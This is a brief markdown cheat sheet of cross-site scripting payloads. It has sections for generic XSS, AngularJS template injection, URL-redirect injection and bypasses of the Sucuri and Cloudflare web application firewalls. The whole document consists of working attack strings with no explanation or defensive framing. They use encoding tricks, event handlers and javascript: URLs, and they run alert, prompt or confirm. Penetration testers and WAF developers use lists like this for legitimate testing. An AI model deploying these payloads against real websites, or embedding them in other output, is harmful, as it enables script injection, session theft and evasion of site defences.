
## XSS Payload
--- 
```
'-confirm(document.domain)-'
'-prompt`1 `-'@blahblah.com
**Sucuri WAF XSS bypass**
"><input/onauxclick="[1].map(prompt)">

**angular JS**
{{constructor.constructor('alert(1)')()}}

```
<br>

## Bypass url redirect XSS**
--- 
```
%2500%27onmouseover=%27window.stop();alert(document.domain)
%27style=%27font-size:1000px;background-color:red%27
```
<br>

##CloudFlare bypass
--- 
```
<iframe/src='%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A:prompt`1`'>
<svg onload=prompt%26%230000000040document.domain)>
<--`<img/src=` onerror=confirm``> --!>
</Scrpt/"%27--!>%20<Scrpt>%20confirm(1)%20</Scrpt>
</> " <a+HREF='%26%237javascrip%26%239t:alert%26lpar;document.domain)'> " </>
```